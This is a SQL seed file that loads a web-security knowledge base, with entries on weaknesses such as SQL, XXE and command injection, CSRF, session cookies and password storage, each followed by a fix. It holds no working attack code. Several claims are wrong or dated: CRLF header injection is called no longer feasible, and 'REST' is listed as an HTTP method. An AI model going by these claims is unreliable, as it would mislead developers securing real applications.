INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Dynamic scripting injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen user input is used to evaluate scripting code then this could introduceNEWLINEhigh security risks. If the input is not properly escaped an attacker can inject his ownNEWLINEscript code and gain access to the server.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use direct user-input in the dynamic scripting function. You should firstNEWLINEuse an input validation or encoding function on the user submitted data to clean andNEWLINEsanitize the input against malicious intent.NEWLINE', 'Dynamic scripting injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Regular expression injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the application uses regular expressions which receives user input,NEWLINEthen the user input should be properly escaped.NEWLINEIf not done properly then the hacker can affect the regular expression and modify theirNEWLINElogic. In some cases, an attacker could even gain access to the serverNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use user-input without escaping in a regular expressions "regex pattern".NEWLINESince this could lead to serious security vulnerabilities.NEWLINE', 'Regular expression injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Automated spamming via feedback scriptsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA hacker must not gain the possibility to abuse an applications email functionality byNEWLINEmeans of scripts which sends automated spamming mails.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis problem could be prevented by implementing CAPTCHA or rate-limiting mechanisms.NEWLINE', 'Automated spamming via feedback scripts'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies without the Secure flagNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe secure flag is an option that can be set when creating a cookie.NEWLINEThis flag ensures that the cookie will not be sent over an unencryptedNEWLINEconnection by the browser.NEWLINEWhich ensures that the session cookie can not be send over a non-encrypted link.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen creating a session cookie which is send over an encrypted connectionNEWLINEyou should set the secure flag. The Secure flag should be set during every set-cookie.NEWLINEThis will instruct the browser to never send the cookie over HTTP.NEWLINEThe purpose of this flag is to prevent the accidental exposure of a cookie value if a userNEWLINEfollows an HTTP link.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Session managementNEWLINE', 'Session cookies without the Secure flag'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies without the HttpOnly flagNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe http-only flag is an option that can be set when creating a cookie.NEWLINEThis flag ensures that the cookie can not be read or edited by javascript.NEWLINEThis ensures that an attacker can not steal this cookie as a cross-site scriptingNEWLINEvulnerability is present in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe HTTP-Only flag should be set to disable malicious script access to the cookie valuesNEWLINEsuch as the session ID value. Also disable unnecessary http request methods because ofNEWLINEthe TRACE option. Misconfiguration of the HTTP request headers can lead to stealing theNEWLINEsession cookie even though http-only protection is in place.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- HTTP request methodsNEWLINE- Session managementNEWLINE', 'Session cookies without the HttpOnly flag'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Command injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECommand injection is an attack in which the goal is execution of arbitrary commands onNEWLINEthe host operating system via a vulnerable application. Command injection attacks areNEWLINEpossible when an application passes unsafe user supplied dataNEWLINE(forms, cookies, HTTP headers etc.) to a system shell. In this attack,NEWLINEthe attacker-supplied operating system commands are usually executed with the privilegesNEWLINEof the vulnerable application. Command injection attacks are possible largely due toNEWLINEinsufficient input validation. This attack differs from Code Injection, in that codeNEWLINEinjection allows the attacker to adds his own code that is then executed by the application.NEWLINEIn Code Injection, the attacker extends the default functionality of the applicationNEWLINEwithout the necessity of executing system commands.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUser-input that is used in a shell command should not contain dangerous characters.NEWLINEA blacklist of characters is not a good option because it may be difficult to think ofNEWLINEall of the characters to validate against. A white list containing only allowableNEWLINEcharacters should be created to validate the user-input.NEWLINE', 'Command injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# External session hijackingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an attacker obtains a users session cookie, then he could steal the identity of theNEWLINEuser which the session cookie belonged to.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAs soon as a session is set for an authenticated user,NEWLINEthe server should keep track of the IP address in which the user used when he started the session.NEWLINEWhen the server discovers a change in IP address, for instance when an attacker hijacks anNEWLINEusers session. The server then should deny access, destroy the session and redirect theNEWLINE''hijacker'' to the login page.NEWLINE', 'External session hijacking'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure transmission of session cookiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the session cookies are sent over an unencrypted connection,NEWLINEthey should be withdrawn immediately.NEWLINEThese cookies are not to be trusted anymore as a hacker may have captured their values.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession cookies that are used to authenticate the user should always be set on aNEWLINEsecure connection.NEWLINENEWLINEIn order to achieve this you should set the "secure" flag on your session cookieNEWLINEto make sure your application in any circumstance does not send this cookie over nonNEWLINEHTTPS connections.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Session managementNEWLINE', 'Insecure transmission of session cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unproven cryptographic algorithmsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe encryption techniques used in the application must be known and proven methods.NEWLINEWhen there is a self-made hashing algorithm developed it is very likely to containNEWLINEvulnerabilities due to math-flaws resulting in encryption which can be broken.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever implement your own designed Crypto functions.NEWLINEVerify that cryptographic modules used by the application have been validated againstNEWLINEFIPS 140-2 or an equivalent standard.NEWLINE', 'Unproven cryptographic algorithms'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client-side authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application could implement authentication functionalities through JavaScript and HTML.NEWLINEHowever, these are client-side constraints that are imposed, which means that a hackerNEWLINEcan easily disable or modify these constraints.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever implement client-side authentication constraints, since these are easily bypassed.NEWLINEWhen implementing authentication methods always use server-side solutions.NEWLINE', 'Client side authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identifier-based authorizationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn application uses parameters in order to process data.NEWLINEThese parameters can also be used to assign certain roles and retrieveNEWLINENEWLINEContent corresponding with those parameters. Imagine the following example:NEWLINENEWLINE    www.target.com/index.php?loggedin=userNEWLINENEWLINEIn this situation the application will get content and subscribe user roles corresponding to the user parameterNEWLINENEWLINE    www.target.com/index.php?loggedin=adminNEWLINENEWLINEIn this situation the application will get content and subscribe user roles corresponding to the admin parameter.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever you are checking whether a user is restricted to review certain data, the accessNEWLINErestrictions should be processed server-side.NEWLINENEWLINEThe userID should be stored inside of a session variable on login and should be used toNEWLINEretrieve user data from the database like : SELECT data from personaldata where userID=:id <- session varNEWLINENEWLINENow an possible attacker can not tamper and change the application operation since theNEWLINEidentifier for retrieving the data is handled server-side.NEWLINE', 'Identifier based authorization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Missing authentication or authorizationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf pages are not properly checked for authentication or authorization, an attacker couldNEWLINEabuse these flaws. The consequences are differ per application but may lead toNEWLINEhigh risk vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEYou should verify all access controls are implemented properly in order toNEWLINEprevent a user access data/functions which he was not intended to use.NEWLINE', 'Missing authentication or authorization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SQL injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll SQL queries, HQL, OSQL, NOSQL and stored procedures, calling of stored procedures should beNEWLINEprotected by the use of query parameterization.NEWLINEIf not an attacker can inject malicious code into these queries he gains the ability toNEWLINEmanipulate them and now he can withdraw, update and delete data which is stored on theNEWLINEtarget database.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe use of prepared statements and parameterized queries is how all developers shouldNEWLINEfirst be taught how to write database queries. They are simple to write, and easier toNEWLINEunderstand than dynamic queries. Parameterized queries force the developer to first defineNEWLINEall the SQL code, and then pass in each parameter to the query later. This coding styleNEWLINEallows the database to distinguish between code and data, regardless of what user inputNEWLINEis supplied.NEWLINE', 'Prepared statements and query parameterization'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# CSRF injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,NEWLINEemail, blog, instant message, or program causes a users Web browser to perform an unwantedNEWLINEaction on a trusted site for which the user is currently authenticated.NEWLINENEWLINEThe impact of a successful cross-site request forgery attack is limited to theNEWLINEcapabilities exposed by the vulnerable application. For example, this attack could resultNEWLINEin a transfer of funds, changing a password, or purchasing an item in the users context.NEWLINEIn effect, CSRF attacks are used by an attacker to make a target system perform aNEWLINEfunction (funds Transfer, form submission etc.) via the targets browser withoutNEWLINEknowledge of the target user at least until the unauthorised function has been committed.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo arm an application against automated attacks and tooling you need to use unique tokensNEWLINEwho are included into the forms of an application, API calls or AJAX requests.  NEWLINEAny state changing operation requires a secure random token (e.g CSRF token) to preventNEWLINEagainst CSRF attacks. Characteristics of a CSRF Token are Unique and is a large randomNEWLINEvalue generated by a cryptographically secure random number generator.NEWLINENEWLINEThe CSRF token is then added as a hidden field for forms and validated on the sever side wheneverNEWLINEa user is sending a request to the server.NEWLINE', 'csrf injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Are all passwords hashed, salted and stretched NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a password is not properly hashed, salted and stretched an attacker could easilyNEWLINEabuse the password when obtained.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEA user should always be forced to use a proper password when signing in into the application.NEWLINEPreferably a pass-phrase instead of a password. This in order to extend the durationNEWLINEof a brute-force attack.NEWLINENEWLINEVerify that account passwords are protected using an adaptive key derivation function.NEWLINEMake sure the salt for the user is always unique and you apply bcrypt, scrypt orNEWLINEPBKDF2 before storing the password, with a minimum work factor iteration count of 150,000NEWLINEloops to eliminate the possibility of brute forcing.NEWLINE', 'Are all passwords hashed, salted and stretched'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information transmitted by un-encrypted methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive information is send by unencrypted methods an attacker could interceptNEWLINEthis data and use this for malicious intents.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll sensitive information should always be send by an encrypted methodsNEWLINEsuch as HTTPS connections.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Secure sessionNEWLINE- HTTP strict transport securityNEWLINE- HSTS preloadNEWLINE- Certificate pinningNEWLINE', 'Sensitive information transmitted by unencrypted methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session information is not stored server-sideNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever session information is not stored server-side an attacker could easily tamperNEWLINEand manipulate these values. This is always a bad idea and you should not do this!NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession information should always be stored server-side by means of a server-side language.NEWLINE', 'Session information is not stored server side'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The crossdomain.xml should only contains trusted domains NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe use of a crossdomain.xml file is required when the web application uses Flash.NEWLINEThis file is used to set up restrictions for any other web servers using theNEWLINEflash application. If these are not set correctly, an attacker could exploit this toNEWLINEexecute targeted attacks against the users of the web application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways make sure the crossdomain.xml only contains trusted domains.NEWLINE', 'The crossdomain.xml should only contains trusted domains'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session ids should be generated with sufficient entropy  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever session ids are not generated with a sufficient entropy this could lead to aNEWLINEsession collision or session hijacking. If an attacker can guess an authenticated user''sNEWLINEsession identifier, he can take over the user''s session.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe WebLogic deployment descriptor should specify a session identifier length of atNEWLINEleast 128 bits. A shorter session identifier leaves the application open toNEWLINEbrute-force session guessing attacks.NEWLINE', 'Session ids should be generated with sufficient entropy'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User generated session ids should be rejected by the server  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever user generated session ids are not rejected by the server,NEWLINEan attacker could change the session credentials given by the server on the targetsNEWLINEcomputer into an easy to remember value.NEWLINENEWLINEWhen the attacker then changes his own session credentials with the easily to rememberNEWLINEvalue he used on the target''s computer. The attacker could do a session hijackingNEWLINEon the targets current session.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll session ids not generated by the server should be rejected.NEWLINE', 'User generated session ids should be rejected by the server'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The logout functionality should revoke the complete session  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen the logout functionality does not revoke the complete session an attacker couldNEWLINEimpersonate a user when he has access to the session cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe logout functionality should revoke the complete session whenever a userNEWLINEwants to terminate his session.NEWLINENEWLINEEach different framework has its own guide to achieve this revocation.NEWLINEIt is also recommended for you to make testcases which you follow to ensureNEWLINEsession revocation in your application.NEWLINE', 'The logout functionality should revoke the complete session'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The login functionality should always generate (and use) a new session id  NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an user is successfully authenticated the application should generate aNEWLINEnew session cookie.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe login functionality should always generate (and use) a new session id after aNEWLINEsuccessful login. This is done to prevent an attacker doing a session fixation attackNEWLINEon your users.NEWLINENEWLINESome frameworks do not provide the possibility to change the session id on login such asNEWLINE.net applications. Whenever this problem occurs you could set an extra random cookie onNEWLINElogin  with a strong token and store this value in a session variable.NEWLINENEWLINENow you can compare the cookie value with the session variable in order to preventNEWLINEsession fixation since the authentication does not solely relies on the session id sinceNEWLINEthe random cookie can not be predicted or fixated by the attacker.NEWLINE', 'The login functionality should always generate a new session id'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Does the application enforce the use of secure passwordsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen an application does not enforce the use of secure passwords,NEWLINEthese passwords could easily be brute-forced thus compromising the users account.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe user should be enforced to use secure passwords. This can be done by using aNEWLINEpassphrase policy. Also known top 1000 passwords should also be forbidden.NEWLINENEWLINE## NOTE:NEWLINENever put restrictions on the password the user submits. Some applications forNEWLINEinstance do not allow passwords longer than twenty chars. This is an example of badNEWLINEpractice since the password must be allowed as strong as the users wants it to be.NEWLINE', 'Does The application enforce the use of secure passwords'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XXE injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEProcessing of an Xml eXternal Entity containing tainted data may lead to disclosure ofNEWLINEconfidential information and other system impacts.NEWLINEThe XML 1.0 standard defines the structure of an XML document.NEWLINEThe standard defines a concept called an entity, which is a storage unit of some type.NEWLINENEWLINEThere exists a specific type of entity, an external general parsed entity often shortenedNEWLINEto an external entity, that can access local or remote content via a declared systemNEWLINEidentifier and the XML processor may disclose confidential information normally notNEWLINEaccessible by the application. Attacks can include disclosing local files, which mayNEWLINEcontain sensitive data such as passwords or privateNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the possibility to fetch resources from an external source.NEWLINEThis is normally done in the configuration of the used XML parser.NEWLINE', 'XXE injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session IDs do not timeout (idl)NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll sessions should implement an idle or inactivity timeout.NEWLINEThis timeout defines the amount of time a session will remain active in case there is noNEWLINEactivity in the session, closing and invalidating the session upon the defined idle periodNEWLINEsince the last HTTP request received by the web application for a given session ID.NEWLINEThe idle timeout limits the chances an attacker has to guess and use a valid session IDNEWLINEfrom another user. However, if the attacker is able to hijack a given session,NEWLINEthe idle timeout does not limit the attacker''s actions, as he can generate activity onNEWLINEthe session periodically to keep the session active for longer periods of time.NEWLINENEWLINESession timeout management and expiration must be enforced server-side. If the client isNEWLINEused to enforce the session timeout, for example using the session token or other clientNEWLINEparameters to track time references (e.g. number of minutes since login time), an attackerNEWLINEcould manipulate these to extend the session duration.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll user sessions should time-out based on logic server-side in order to decrease anNEWLINEattackers attack vector on the user session.NEWLINE', 'Session IDs do not timeout.(idl)'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Directory listingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever directory listing is enabled an attacker could gain sensitive information aboutNEWLINEthe systems hierarchical structure and gain knowledge about directories or files which shouldNEWLINEpossibly not be publicly accessible. An attacker could use this information toNEWLINEincrease his attack vector. In some cases this could even lead to an attacker gaining knowledge aboutNEWLINEcredentials or old vulnerable system demo functions which might lead to remote code execution.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDifferent types of servers require a different type of approach in order to disableNEWLINEdirectory listing. For instance: apache uses a .htacces in order to disable directory listing.NEWLINEAs in iis7 directory listing is disabled by default.NEWLINE', 'Directory listing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Unnecessary features enabled or installedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there are unnecessary features enabled or installed this could increaseNEWLINEthe attack vector which could lead to serious danger such as XXE/CMD/XSS injections.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all features and software available on the application/server is necessary forNEWLINEapplication to work proper. If not, uninstall or disable these services.NEWLINE', 'Unnecessary features enabled or installed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Avoid the use of default and predictable accountsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever default or predictable accounts are available on an application/server this couldNEWLINElead to an attacker compromising these services. Make sure all default and predictableNEWLINEaccounts are disabled or deleted from the services.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all keys and passwords are replaceable, and are generated orNEWLINEreplaced after installation time.NEWLINE', 'Avoid the use of default and predictable acounts.'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Security settings in your development frameworksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever certain security settings in your application frameworksNEWLINE(e.g., Struts, Spring, ASP.NET) and libraries are not set to secure values this could leadNEWLINEto vulnerabilities in your application which an attacker could exploit.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all your security settings in your development framework are set to secure values.NEWLINEThis can be checked by using hardening guides.NEWLINE', 'Security settings in your development frameworks'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure datastorageNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever sensitive data is stored clear-text this data is compromised as soon as itNEWLINEfalls into the hands of an attacker.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESensitive data in all forms should always be stored by an encrypted manner.NEWLINEWe recommend to follow the "Secure Cryptographic datastorage" cheatsheet found on OWASP.NEWLINENEWLINEhttps://www.owasp.org/index.php/Cryptographic_Storage_Cheat_SheetNEWLINE', 'Insecure datastorage'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication based on the knowledge of a secret URLNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis is a form of security by obscurity. Whenever an attacker manages to fuzz or spiderNEWLINEthis url the application could compromise whatever is behind this url.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways implement proper authentication mechanisms that is not using a static authentication URL.NEWLINE', 'Authentication based on the knowledge of a secret URL'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Open forward and Open redirectsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUnvalidated redirects and forwards are possible when a web application accepts untrustedNEWLINEinput that could cause the web application to redirect the request to a URL containedNEWLINEwithin untrusted input. By modifying untrusted URL input to a malicious site, an attackerNEWLINEmay successfully launch a phishing scam and steal user credentials. Because the serverNEWLINEname in the modified link is identical to the original site, phishing attempts may haveNEWLINEa more trustworthy appearance. Unvalidated redirect and forward attacks can also be usedNEWLINEto maliciously craft a URL that would pass the application''s access control check andNEWLINEthen forward the attacker to privileged functions that they would normally not be ableNEWLINEto access.NEWLINENEWLINE## Solution:NEWLINENEWLINEUse a whitelisting method for determining where the user should be redirected towards.NEWLINEYou could also show a warning when redirecting to potentially untrusted content.NEWLINE', 'Open forward and Open redirects'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Incorrect or missing charset NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen the browser has to guess the charset according of the content that is presented byNEWLINEthe application, then this could could lead to XSS injections when guessing wrong.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDefine the charset for all your pages in order to prevent the browser for guessingNEWLINEthe content types.NEWLINENEWLINEThis could be done by adding a meta header in the head of your HTML like:NEWLINENEWLINEFor HTML4:NEWLINE```htmlNEWLINE<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">NEWLINE```NEWLINEFor HTML5:NEWLINE```htmlNEWLINE<meta charset="UTF-8">NEWLINE```NEWLINEOr simply by setting content-type headers by your server-side language,NEWLINEC# example of a content type header:NEWLINEResponse.AppendHeader("Content-Type:text/html", "charset=UTF-8");NEWLINE', 'Incorrect or missing charset'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Extraneous files in document rootNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the document root contains extraneous files, these files could be accessed by anNEWLINEattacker or could possibly contain functionality witch could contain other vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEExtraneous files in document root should be investigated and deleted if it''s not necessaryNEWLINEfor operation of the application.NEWLINE', 'extraneous files in document root'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# X-Path injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWeb applications heavily use databases to store and access the data they need for theirNEWLINEoperations. Historically, relational databases have been by far the most commonNEWLINEtechnology for data storage, but, in the last years, we are witnessing an increasingNEWLINEpopularity for databases that organise data using the XML language.NEWLINEJust like relational databases are accessed via SQL language, XML databases use X-Path asNEWLINEtheir standard query language.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEJust like the techniques to avoid SQL injection, you need to use a parameterised X-PathNEWLINEinterface if one is available, or escape the user input to make it safe to include in aNEWLINEdynamically constructed query. If you are using quotes to terminate untrusted input in aNEWLINEdynamically constructed X-Path query, then you need to escape that quote in the untrustedNEWLINEinput to ensure the untrusted data can not try to breakNEWLINEout of that quoted context.NEWLINE', 'X Path injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Username enumerationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application generates an error like:NEWLINENEWLINE"This username already exists"NEWLINENEWLINEAn attacker could enumerate these usernames, enlarging his chance for a successfulNEWLINEbrute-force attack. Same goes for "Password forget" functions.NEWLINENEWLINEWhenever an user forgot his password, make him fill in his email addressNEWLINErather than an username.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll error messages should be generalized in order to prevent username enumeration.NEWLINEAlso sometimes you cannot avoid information leaking in functionalities such as aNEWLINEregistration page. Here you need to use tar-pitting methods to prevent an automatedNEWLINEattack by an attacker.NEWLINENEWLINEAlso recommended knowledge-base item:NEWLINENEWLINE- Differential analysis attackNEWLINE', 'Username enumeration'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP header injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP header injection is a general class of web application security vulnerability whichNEWLINEoccurs when Hypertext Transfer Protocol (HTTP) headers areNEWLINEdynamically generated based on user input. Header injection in HTTP responses can allowNEWLINEfor HTTP response splitting (also known as CRLF, Carriage Return Line Feed),NEWLINESession fixation via the Set-Cookie header, cross-site scripting (XSS),NEWLINEand malicious redirect attacks via the location header. HTTP header injection is aNEWLINErelatively new area for web-based attacks, and has primarily been pioneeredNEWLINEby Amit Klein in his work on request/response smuggling/splitting.NEWLINEVulnerabilities due to HTTP header injections such as CRLF are no longerNEWLINEfeasible due to the fact that multiple header requests are not possible.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhen user-input will be used in HTTP headers then the newlines should be escaped in aNEWLINEcorrect manner. Recommended would be a whitelist of expected input or use a validation methodNEWLINEwhich for example only accepts alphanumeric values. Every detection of input which is out ofNEWLINEthe intended operation should be rejected.NEWLINE', 'HTTP header injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# GET/POST requestsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthors of services which use the HTTP protocol SHOULD NOT use GET based forms for theNEWLINEsubmission of sensitive data, because this will cause this data to beNEWLINEencoded in the Request-URI. Many existing servers, proxies,NEWLINEand browsers will log the request URI in some place where it might beNEWLINEvisible to third parties. Servers can use POST-based form submission instead.NEWLINEGET parameters are also more likely to be vulnerable to XSS. Please refer to theNEWLINEXSS manual in the knowledge base for more information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever transmitting sensitive data always do this by means of the POST request or by header.NEWLINENote: Avoid user-input in your application header, this could lead to vulnerabilities.NEWLINEAlso make sure you also disable all other HTTP request methods which are unnecessary forNEWLINEyour applications operation such as: REST, PUT, TRACE, DELETE, OPTIONS, etc, sinceNEWLINEallowing these other request methods could lead to vulnerabilities and injections.NEWLINE', 'GET POST requests'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Insecure internal communicationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever organizations communicate by means of unencrypted connections, an attackerNEWLINEcould easily sniff these insecure communication and gain sensitive information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse TLS encrypted data lines for all internal communication channels.NEWLINEAlso your infrastructure should not traverse unencrypted or weakly encrypted links. BecauseNEWLINEif so, than all your data''s integrity and confidentiality will be lost.NEWLINE', 'Insecure internal communication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Sensitive information stored alongside the source codeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes when developing an application a programmer stores a password or otherNEWLINEcredentials into the source-code as a comment for other developers toNEWLINElogin into the application. When these comments still exist in a live environment,NEWLINEan attacker could use these credentials to gain access to the system.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESearch your source code for comments which contains possible user-credentials.NEWLINEYou should also verify that there are no secrets and API keys are included in theNEWLINEsource code, or end up within the resulting binary.NEWLINENEWLINEThis also goes for providing information about business logic and other critical sensitiveNEWLINEinformation. Verify that there is no sensitive business logic, secret keys or otherNEWLINEproprietary information in client side code.NEWLINE', 'Sensitive information stored alongside the source code'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The possible risks to the application must be documentedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe information that is stored of the application and/or userNEWLINEactivities needs to be documented, this will make it transparent where sensitiveNEWLINEinformation is stored and why.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECreate a section in the documentation of the project that defines the informationNEWLINEthat will be stored. This makes it easier to make estimations about critical partsNEWLINEof your application which deserve extra attention.NEWLINE', 'The possible risks to the application must be documented'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Possible attackers of the application must be documentedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEActivity logs of the hackers session is very valuable information and is very helpfulNEWLINEwhen investigating a hack on an application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe possible attackers needs to be monitored as much as possible. This information isNEWLINEcrucial for forensics and law enforcements.NEWLINENEWLINERecommended knowlege-base items:NEWLINENEWLINE- Audit logsNEWLINE- User credentials in audit logsNEWLINE- Log injectionNEWLINE- Repudiation attacksNEWLINE- Logging guidelinesNEWLINE- Logging is performed before executing the transactionNEWLINE', 'Possible attackers of the application must be documented'); 
